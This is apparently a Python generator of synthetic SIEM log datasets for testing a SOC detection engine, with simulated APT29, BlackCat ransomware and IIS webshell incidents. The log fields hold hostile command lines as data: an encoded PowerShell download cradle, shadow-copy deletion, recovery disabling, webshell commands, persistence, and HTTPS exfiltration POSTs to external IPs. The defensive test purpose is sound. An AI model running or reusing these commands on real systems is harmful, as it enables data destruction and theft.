"""
Generador de Datasets de Prueba SIEM (.xlsx) para JEV Cyber Command OS (SOC Nivel 2).
Crea escenarios sintéticos hiperrealistas para validar la autonomía del motor de correlación,
detección de trampas en severidad 'Informational', mitigación MITRE ATT&CK y generación de grafos.
"""

from __future__ import annotations
import datetime
import random
import pandas as pd


COLUMNS = [
    "Log_ID",
    "Timestamp",
    "Hostname",
    "Event_ID",
    "User",
    "Source_IP",
    "Destination",
    "Log_Source",
    "Event_Description",
    "Process_CommandLine",
    "Result",
    "Severity",
]


def generate_baseline_noise(start_dt: datetime.datetime, count: int, host_pool: list[str], user_pool: list[str]) -> list[dict]:
    """Genera logs legítimos de ruido de fondo corporativo (Active Directory, Kerberos, DHCP, file share)."""
    noise = []
    normal_ips = [f"10.10.1.{i}" for i in range(10, 60)] + [f"10.10.2.{i}" for i in range(10, 40)]
    normal_procs = [
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
        "C:\\Windows\\System32\\taskhostw.exe",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Windows\\System32\\SearchIndexer.exe",
        "C:\\Windows\\System32\\lsass.exe",
    ]

    for i in range(count):
        cur_time = start_dt + datetime.timedelta(seconds=random.randint(10, 7200))
        evt_type = random.choice(["4624_ok", "4634_off", "4688_proc", "5140_share", "5156_net"])
        host = random.choice(host_pool)
        user = random.choice(user_pool)
        src_ip = random.choice(normal_ips)

        if evt_type == "4624_ok":
            noise.append({
                "Timestamp": cur_time,
                "Hostname": host,
                "Event_ID": "4624",
                "User": user,
                "Source_IP": src_ip,
                "Destination": host,
                "Log_Source": "Security",
                "Event_Description": "An account was successfully logged on (LogonType=3 Network)",
                "Process_CommandLine": "-",
                "Result": "Success",
                "Severity": "Informational",
            })
        elif evt_type == "4634_off":
            noise.append({
                "Timestamp": cur_time,
                "Hostname": host,
                "Event_ID": "4634",
                "User": user,
                "Source_IP": src_ip,
                "Destination": "-",
                "Log_Source": "Security",
                "Event_Description": "An account was logged off",
                "Process_CommandLine": "-",
                "Result": "Success",
                "Severity": "Informational",
            })
        elif evt_type == "4688_proc":
            noise.append({
                "Timestamp": cur_time,
                "Hostname": host,
                "Event_ID": "4688",
                "User": user,
                "Source_IP": src_ip,
                "Destination": "-",
                "Log_Source": "Security",
                "Event_Description": "A new process has been created",
                "Process_CommandLine": random.choice(normal_procs),
                "Result": "Success",
                "Severity": "Informational",
            })
        elif evt_type == "5140_share":
            noise.append({
                "Timestamp": cur_time,
                "Hostname": host,
                "Event_ID": "5140",
                "User": user,
                "Source_IP": src_ip,
                "Destination": "\\\\FS-SRV02\\SharedDocs",
                "Log_Source": "Security",
                "Event_Description": "A network share object was accessed",
                "Process_CommandLine": "-",
                "Result": "Success",
                "Severity": "Informational",
            })
        else:
            noise.append({
                "Timestamp": cur_time,
                "Hostname": host,
                "Event_ID": "5156",
                "User": user,
                "Source_IP": src_ip,
                "Destination": "10.10.1.10:445",
                "Log_Source": "Security",
                "Event_Description": "The Windows Filtering Platform has permitted a connection",
                "Process_CommandLine": "-",
                "Result": "Success",
                "Severity": "Informational",
            })
    return noise


# =============================================================================
# DATASET 1: SIMULACRO APT29 (RED TEAM ADVANCED KILL CHAIN)
# =============================================================================
def build_dataset_apt29() -> pd.DataFrame:
    """
    Escenario APT29 / Cozy Bear:
    1. Password Spraying desde IP pública 185.220.101.44 (28 intentos fallidos sobre 7 cuentas -> login exitoso de CORP\\mrossi rotulado Informational)
    2. RDP Ingress desde IP pública 194.26.29.80 -> Login interactivo -> Reconocimiento lateral SMB
    3. Staging y Exfiltración de archivos confidenciales con tar.exe -> POST HTTPS C2 195.123.245.90
    4. Persistencia silenciosa con Service Install (Event 7045) y Scheduled Task (Event 4698) para C:\\ProgramData\\healthmon.exe
    5. Normalización: Fragmentación DC-02 vs DC02 y cuentas CORP\\backupsvc vs CORP\\svc_backup
    """
    base_time = datetime.datetime(2026, 11, 4, 8, 15, 0)
    records = []

    # Ruido base: 450 eventos
    host_pool = ["DC-02", "DC02", "FS-SRV02", "APP-SRV02", "WS-055", "WS-062", "WS-074", "PROXY-02"]
    user_pool = ["CORP\\jdoe", "CORP\\mrossi", "CORP\\alopez", "CORP\\csanchez", "CORP\\svc_backup", "CORP\\dgonzalez", "SYSTEM"]
    records.extend(generate_baseline_noise(base_time, 420, host_pool, user_pool))

    # INCIDENTE 1: Password Spraying externo
    spray_ip = "185.220.101.44"
    spray_users = ["CORP\\jdoe", "CORP\\alopez", "CORP\\csanchez", "CORP\\finance_mgr", "CORP\\dgonzalez", "CORP\\hr_lead", "CORP\\mrossi"]
    t = base_time + datetime.timedelta(minutes=15)
    for i in range(28):
        t += datetime.timedelta(seconds=12)
        records.append({
            "Timestamp": t,
            "Hostname": random.choice(["DC-02", "DC02"]),
            "Event_ID": "4625",
            "User": spray_users[i % len(spray_users)],
            "Source_IP": spray_ip,
            "Destination": "10.10.1.5:88",
            "Log_Source": "Security",
            "Event_Description": "An account failed to log on. SubStatus: 0xC000006A (Bad Password)",
            "Process_CommandLine": "-",
            "Result": "Failure",
            "Severity": "Warning",
        })
    # Éxito de Spraying camuflado en Informational
    t += datetime.timedelta(seconds=15)
    records.append({
        "Timestamp": t,
        "Hostname": "DC-02",
        "Event_ID": "4624",
        "User": "CORP\\mrossi",
        "Source_IP": spray_ip,
        "Destination": "10.10.1.5:88",
        "Log_Source": "Security",
        "Event_Description": "An account was successfully logged on (LogonType=3 Network)",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })
    t += datetime.timedelta(seconds=2)
    records.append({
        "Timestamp": t,
        "Hostname": "DC-02",
        "Event_ID": "4672",
        "User": "CORP\\mrossi",
        "Source_IP": spray_ip,
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "Special privileges assigned to new logon",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })

    # INCIDENTE 2: RDP Ingress & Movimiento Lateral SMB
    rdp_ip = "194.26.29.80"
    t = base_time + datetime.timedelta(minutes=40)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-055",
        "Event_ID": "4624",
        "User": "CORP\\admin",
        "Source_IP": rdp_ip,
        "Destination": "10.10.1.55:3389",
        "Log_Source": "Security",
        "Event_Description": "Remote Desktop Logon (LogonType=10)",
        "Process_CommandLine": "LogonType=10; ClientName=APT_STATION; ClientIP=194.26.29.80",
        "Result": "Success",
        "Severity": "Medium",
    })
    for cmd in [
        "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=",
        "net.exe view \\\\FS-SRV02",
        "cmd.exe /c net share",
        "cmd.exe /c ping -n 1 FS-SRV02",
    ]:
        t += datetime.timedelta(seconds=20)
        records.append({
            "Timestamp": t,
            "Hostname": "WS-055",
            "Event_ID": "4688",
            "User": "CORP\\admin",
            "Source_IP": "10.10.1.55",
            "Destination": "-",
            "Log_Source": "Security",
            "Event_Description": "A new process has been created",
            "Process_CommandLine": cmd,
            "Result": "Success",
            "Severity": "High" if "Enc" in cmd else "Informational",
        })
    # Acceso lateral a recursos compartidos por SMB
    t += datetime.timedelta(seconds=15)
    records.append({
        "Timestamp": t,
        "Hostname": "FS-SRV02",
        "Event_ID": "5145",
        "User": "CORP\\admin",
        "Source_IP": "10.10.1.55",
        "Destination": "\\\\FS-SRV02\\ConfidentialDocs",
        "Log_Source": "Security",
        "Event_Description": "A network share object was checked to see whether client can be granted desired access",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Warning",
    })

    # INCIDENTE 3: Staging & Exfiltración C2 Masiva
    t = base_time + datetime.timedelta(minutes=65)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-055",
        "Event_ID": "4688",
        "User": "CORP\\admin",
        "Source_IP": "10.10.1.55",
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "tar.exe -cf C:\\Users\\Public\\intel_dump.tar C:\\Engineering\\DesignDocs",
        "Result": "Success",
        "Severity": "Informational",  # Trampa clásica de severidad
    })
    for p in range(6):
        t += datetime.timedelta(seconds=14)
        records.append({
            "Timestamp": t,
            "Hostname": "PROXY-02",
            "Event_ID": "PROXY_ACCESS",
            "User": "CORP\\admin",
            "Source_IP": "10.10.1.55",
            "Destination": "195.123.245.90:443",
            "Log_Source": "Proxy",
            "Event_Description": "HTTP POST CONNECT /upload/stream bytes_sent=45000000 status=200",
            "Process_CommandLine": "POST https://195.123.245.90/api/v2/telemetry payload=intel_dump.tar",
            "Result": "Success",
            "Severity": "High",
        })

    # INCIDENTE 4: Persistencia Dual (Servicio 7045 + Tarea Programada 4698)
    t = base_time + datetime.timedelta(minutes=85)
    records.append({
        "Timestamp": t,
        "Hostname": "APP-SRV02",
        "Event_ID": "4624",
        "User": "CORP\\mrossi",
        "Source_IP": "10.10.1.55",
        "Destination": "10.10.1.20:445",
        "Log_Source": "Security",
        "Event_Description": "An account was successfully logged on (LogonType=3 Network)",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })
    t += datetime.timedelta(seconds=10)
    records.append({
        "Timestamp": t,
        "Hostname": "APP-SRV02",
        "Event_ID": "7045",
        "User": "CORP\\mrossi",
        "Source_IP": "10.10.1.20",
        "Destination": "-",
        "Log_Source": "System",
        "Event_Description": "A service was installed in the system",
        "Process_CommandLine": "ServiceName=SystemHealthMonitor; ImagePath=C:\\ProgramData\\healthmon.exe",
        "Result": "Success",
        "Severity": "High",
    })
    t += datetime.timedelta(seconds=5)
    records.append({
        "Timestamp": t,
        "Hostname": "APP-SRV02",
        "Event_ID": "4698",
        "User": "CORP\\mrossi",
        "Source_IP": "10.10.1.20",
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A scheduled task was created",
        "Process_CommandLine": "TaskName=\\Microsoft\\Windows\\HealthCheck; Action=C:\\ProgramData\\healthmon.exe",
        "Result": "Success",
        "Severity": "High",
    })
    # 4 ejecuciones periódicas del binario de persistencia
    for k in range(4):
        t += datetime.timedelta(minutes=5)
        records.append({
            "Timestamp": t,
            "Hostname": "APP-SRV02",
            "Event_ID": "4688",
            "User": "SYSTEM",
            "Source_IP": "10.10.1.20",
            "Destination": "-",
            "Log_Source": "Security",
            "Event_Description": "A new process has been created",
            "Process_CommandLine": "C:\\ProgramData\\healthmon.exe --daemon",
            "Result": "Success",
            "Severity": "Informational",
        })

    # Cuentas duales y fragmentación
    t += datetime.timedelta(seconds=30)
    records.append({
        "Timestamp": t,
        "Hostname": "DC02",
        "Event_ID": "4624",
        "User": "CORP\\backupsvc",
        "Source_IP": "10.10.1.15",
        "Destination": "10.10.1.6:445",
        "Log_Source": "Security",
        "Event_Description": "An account was successfully logged on",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })

    df = pd.DataFrame(records)
    df = df.sort_values("Timestamp").reset_index(drop=True)
    df["Log_ID"] = [f"EVT-{i+1:05d}" for i in range(len(df))]
    df["Timestamp"] = df["Timestamp"].dt.strftime("%Y-%m-%d %H:%M:%S")
    return df[COLUMNS]


# =============================================================================
# DATASET 2: SIMULACRO RANSOMWARE BLACKCAT / ALPHV
# =============================================================================
def build_dataset_ransomware() -> pd.DataFrame:
    """
    Escenario Ransomware BlackCat:
    1. Incursión inicial por RDP desde 45.142.214.22 hacia WS-089 con cuenta CORP\\admin
    2. Sabotaje y recuperación inhibida con vssadmin delete shadows y bcdedit recoveryenabled No
    3. Staging con 7z.exe en C:\\Users\\Public\\archive.7z y exfiltración C2 hacia 91.240.118.52
    4. Password Spraying desde 185.190.140.23 intentando propagarse en el dominio
    """
    base_time = datetime.datetime(2026, 11, 6, 14, 0, 0)
    records = []

    host_pool = ["DC-01", "DC01", "FS-SRV01", "WS-089", "WS-023", "WS-014", "DB-SRV01"]
    user_pool = ["CORP\\admin", "CORP\\jdoe", "CORP\\backupsvc", "CORP\\svc_backup", "CORP\\rrojas", "SYSTEM"]
    records.extend(generate_baseline_noise(base_time, 380, host_pool, user_pool))

    # INCIDENTE 1: RDP Ingress externo
    rdp_ip = "45.142.214.22"
    t = base_time + datetime.timedelta(minutes=20)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-089",
        "Event_ID": "4624",
        "User": "CORP\\admin",
        "Source_IP": rdp_ip,
        "Destination": "10.10.1.89:3389",
        "Log_Source": "Security",
        "Event_Description": "Remote Desktop Connection Established (LogonType=10)",
        "Process_CommandLine": "LogonType=10; ClientIP=45.142.214.22",
        "Result": "Success",
        "Severity": "High",
    })

    # INCIDENTE 2: Pre-Ransomware Sabotage (VSSadmin & bcdedit)
    t = base_time + datetime.timedelta(minutes=32)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-089",
        "Event_ID": "4688",
        "User": "CORP\\admin",
        "Source_IP": "10.10.1.89",
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "vssadmin.exe delete shadows /all /quiet",
        "Result": "Success",
        "Severity": "High",
    })
    t += datetime.timedelta(seconds=8)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-089",
        "Event_ID": "4688",
        "User": "CORP\\admin",
        "Source_IP": "10.10.1.89",
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "bcdedit.exe /set {default} recoveryenabled no",
        "Result": "Success",
        "Severity": "High",
    })
    t += datetime.timedelta(seconds=12)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-089",
        "Event_ID": "5145",
        "User": "CORP\\admin",
        "Source_IP": "10.10.1.89",
        "Destination": "\\\\FS-SRV01\\Backups",
        "Log_Source": "Security",
        "Event_Description": "Shared file access write test",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })

    # INCIDENTE 3: Staging 7z en carpeta pública & exfiltración masiva
    t = base_time + datetime.timedelta(minutes=45)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-089",
        "Event_ID": "4688",
        "User": "CORP\\admin",
        "Source_IP": "10.10.1.89",
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "7z.exe a C:\\Users\\Public\\finance_exfil.7z C:\\Finance\\*.xlsx -pBlackCat2026",
        "Result": "Success",
        "Severity": "Informational",
    })
    for s in range(5):
        t += datetime.timedelta(seconds=15)
        records.append({
            "Timestamp": t,
            "Hostname": "WS-089",
            "Event_ID": "PROXY_ACCESS",
            "User": "CORP\\admin",
            "Source_IP": "10.10.1.89",
            "Destination": "91.240.118.52:443",
            "Log_Source": "Proxy",
            "Event_Description": "HTTP POST CONNECT /payload_chunk bytes_sent=38000000 status=200",
            "Process_CommandLine": "POST https://91.240.118.52/exfil_drop",
            "Result": "Success",
            "Severity": "High",
        })

    # INCIDENTE 4: Password Spraying lateral
    spray_ip = "185.190.140.23"
    t = base_time + datetime.timedelta(minutes=60)
    for u in ["CORP\\backupsvc", "CORP\\svc_backup", "CORP\\db_admin", "CORP\\rrojas", "CORP\\helpdesk"]:
        for rep in range(3):
            t += datetime.timedelta(seconds=10)
            records.append({
                "Timestamp": t,
                "Hostname": "DC-01",
                "Event_ID": "4625",
                "User": u,
                "Source_IP": spray_ip,
                "Destination": "10.10.1.10:88",
                "Log_Source": "Security",
                "Event_Description": "An account failed to log on (0xC000006A)",
                "Process_CommandLine": "-",
                "Result": "Failure",
                "Severity": "Warning",
            })
    # Login exitoso de backupsvc
    t += datetime.timedelta(seconds=10)
    records.append({
        "Timestamp": t,
        "Hostname": "DC-01",
        "Event_ID": "4624",
        "User": "CORP\\backupsvc",
        "Source_IP": spray_ip,
        "Destination": "10.10.1.10:88",
        "Log_Source": "Security",
        "Event_Description": "An account was successfully logged on",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })

    df = pd.DataFrame(records)
    df = df.sort_values("Timestamp").reset_index(drop=True)
    df["Log_ID"] = [f"EVT-{i+1:05d}" for i in range(len(df))]
    df["Timestamp"] = df["Timestamp"].dt.strftime("%Y-%m-%d %H:%M:%S")
    return df[COLUMNS]


# =============================================================================
# DATASET 3: SIMULACRO WEBSHELL IIS & AMENAZA INTERNA
# =============================================================================
def build_dataset_webshell() -> pd.DataFrame:
    """
    Escenario Webshell IIS + Amenaza Interna:
    1. Reconocimiento HTTP y subida de Webshell ASPX en servidor WEB-01 desde IP 198.51.100.77
    2. Ejecución remota de comandos (RCE) bajo AppPool: cmd.exe /c whoami, net user /domain
    3. Password Spraying desde IP 192.0.2.91
    4. Compresión masiva con zip.exe en C:\\Temp\\records.zip
    """
    base_time = datetime.datetime(2026, 11, 8, 10, 0, 0)
    records = []

    host_pool = ["WEB-01", "DC-01", "APP-SRV01", "DB-SRV01", "WS-018", "FS-SRV01"]
    user_pool = ["CORP\\jdoe", "CORP\\mgarcia", "CORP\\admin", "CORP\\backupsvc", "SYSTEM", "DefaultAppPool"]
    records.extend(generate_baseline_noise(base_time, 350, host_pool, user_pool))

    # INCIDENTE 1: Explotación Web y Webshell RCE
    web_attacker = "198.51.100.77"
    t = base_time + datetime.timedelta(minutes=10)
    for probe in ["/login.aspx", "/admin/upload.aspx", "/files/upload.ashx", "/uploads/avatar.aspx"]:
        t += datetime.timedelta(seconds=8)
        records.append({
            "Timestamp": t,
            "Hostname": "WEB-01",
            "Event_ID": "HTTP_ACCESS",
            "User": "-",
            "Source_IP": web_attacker,
            "Destination": "WEB-01:443",
            "Log_Source": "IIS",
            "Event_Description": f"GET {probe} HTTP/1.1 404 Not Found",
            "Process_CommandLine": f"GET {probe}",
            "Result": "Failure",
            "Severity": "Warning",
        })
    # Subida exitosa y ejecución RCE
    t += datetime.timedelta(seconds=15)
    records.append({
        "Timestamp": t,
        "Hostname": "WEB-01",
        "Event_ID": "HTTP_ACCESS",
        "User": "IIS APPPOOL\\DefaultAppPool",
        "Source_IP": web_attacker,
        "Destination": "WEB-01:443",
        "Log_Source": "IIS",
        "Event_Description": "POST /uploads/cmd.aspx HTTP/1.1 200 OK",
        "Process_CommandLine": "POST /uploads/cmd.aspx?cmd=whoami",
        "Result": "Success",
        "Severity": "High",
    })
    t += datetime.timedelta(seconds=5)
    records.append({
        "Timestamp": t,
        "Hostname": "WEB-01",
        "Event_ID": "4688",
        "User": "IIS APPPOOL\\DefaultAppPool",
        "Source_IP": web_attacker,
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "cmd.exe /c whoami",
        "Result": "Success",
        "Severity": "High",
    })
    t += datetime.timedelta(seconds=10)
    records.append({
        "Timestamp": t,
        "Hostname": "WEB-01",
        "Event_ID": "4688",
        "User": "IIS APPPOOL\\DefaultAppPool",
        "Source_IP": web_attacker,
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "cmd.exe /c net user /domain",
        "Result": "Success",
        "Severity": "High",
    })

    # INCIDENTE 2: Password Spraying
    spray_ip = "192.0.2.91"
    t = base_time + datetime.timedelta(minutes=30)
    for u in ["CORP\\jdoe", "CORP\\mgarcia", "CORP\\rrojas", "CORP\\cgarcia", "CORP\\svc_backup"]:
        for _ in range(4):
            t += datetime.timedelta(seconds=9)
            records.append({
                "Timestamp": t,
                "Hostname": "DC-01",
                "Event_ID": "4625",
                "User": u,
                "Source_IP": spray_ip,
                "Destination": "10.10.1.10:88",
                "Log_Source": "Security",
                "Event_Description": "An account failed to log on (0xC000006A)",
                "Process_CommandLine": "-",
                "Result": "Failure",
                "Severity": "Warning",
            })
    # Login exitoso
    t += datetime.timedelta(seconds=12)
    records.append({
        "Timestamp": t,
        "Hostname": "DC-01",
        "Event_ID": "4624",
        "User": "CORP\\mgarcia",
        "Source_IP": spray_ip,
        "Destination": "10.10.1.10:88",
        "Log_Source": "Security",
        "Event_Description": "An account was successfully logged on",
        "Process_CommandLine": "-",
        "Result": "Success",
        "Severity": "Informational",
    })

    # INCIDENTE 3: Staging con zip.exe y exfiltración
    t = base_time + datetime.timedelta(minutes=50)
    records.append({
        "Timestamp": t,
        "Hostname": "WS-018",
        "Event_ID": "4688",
        "User": "CORP\\mgarcia",
        "Source_IP": "10.10.1.18",
        "Destination": "-",
        "Log_Source": "Security",
        "Event_Description": "A new process has been created",
        "Process_CommandLine": "zip.exe -r C:\\Temp\\records.zip C:\\CorporateData\\Confidential",
        "Result": "Success",
        "Severity": "Informational",
    })
    for _ in range(4):
        t += datetime.timedelta(seconds=16)
        records.append({
            "Timestamp": t,
            "Hostname": "WS-018",
            "Event_ID": "PROXY_ACCESS",
            "User": "CORP\\mgarcia",
            "Source_IP": "10.10.1.18",
            "Destination": "203.0.113.88:443",
            "Log_Source": "Proxy",
            "Event_Description": "HTTP POST CONNECT /upload bytes_sent=24000000 status=200",
            "Process_CommandLine": "POST https://203.0.113.88/exfil",
            "Result": "Success",
            "Severity": "High",
        })

    df = pd.DataFrame(records)
    df = df.sort_values("Timestamp").reset_index(drop=True)
    df["Log_ID"] = [f"EVT-{i+1:05d}" for i in range(len(df))]
    df["Timestamp"] = df["Timestamp"].dt.strftime("%Y-%m-%d %H:%M:%S")
    return df[COLUMNS]


def main():
    print("🚀 Generando datasets de prueba SIEM (.xlsx)...")
    
    datasets = [
        ("SOC_L2_Simulacro_APT29_RedTeam.xlsx", build_dataset_apt29(), "Simulacro APT29 / Cozy Bear"),
        ("SOC_L2_Simulacro_Ransomware_BlackCat.xlsx", build_dataset_ransomware(), "Simulacro Ransomware BlackCat"),
        ("SOC_L2_Simulacro_Insider_Threat_Webshell.xlsx", build_dataset_webshell(), "Simulacro Webshell IIS & Amenaza Interna"),
    ]

    for fname, df, desc in datasets:
        with pd.ExcelWriter(fname, engine="openpyxl") as writer:
            df.to_excel(writer, sheet_name="SIEM Export", index=False)
        print(f"✅ Generado '{fname}' ({len(df)} eventos) — {desc}")


if __name__ == "__main__":
    main()
